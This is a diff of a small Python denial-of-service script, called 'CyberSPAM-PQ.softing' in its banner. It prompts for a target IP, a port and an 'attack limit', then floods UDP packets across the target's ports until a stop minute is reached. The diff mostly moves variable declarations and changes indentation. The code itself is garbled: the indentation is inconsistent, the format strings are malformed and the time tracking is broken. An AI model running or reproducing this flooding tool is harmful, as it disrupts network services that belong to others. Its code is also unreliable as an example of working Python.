@@ -21,9 +21,6 @@ sent = 0
 limit = 0
 app = 0
 port = 0
-stopminute = 0
-nowhour = 0
-nowminute = 0
 
 print('##########################################')
 print ('Wellcome to CyberSPAM-PQ.softing')
@@ -49,24 +46,25 @@ print
 port = int(input('port: '))
 print()
 print('TIME: %s:%s'%(hour,minute))
+stopminute = 0
 print
 limit = int(input('attack limit(minute): '))
 stopminute = minute + limit
 print('End site attack in: %s:%s'%(hour,stopminute))
 print('##########################################')
 
+nowhour = 0
+nowminute = 0
+
 while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-    
-            nowhour = now.hour*1
-            nowminute = now.minute*1
-    
-     print ('s%:s%  >>> sent packet #s% to %s on port:%s'%(nowhour,nowminute,sent,ip,port))
+            sock.sendto(bytes, (ip,port))
+            sent = sent + 1
+            port = port + 1
+            #nowhour = now.hour*1
+            nowminute = now.minute*1 
+     print ('s%:s%  >>> sent packet #s% to %s on port:%s'%(hour,nowminute,sent,ip,port))
      #print (nowminute)
      if port == 65534:
-       port = 1
-
-       if nowminute == stopminute:
-                        sys.exit()
+        port = 1
+     if nowminute == stopminute:
+        sys.exit()
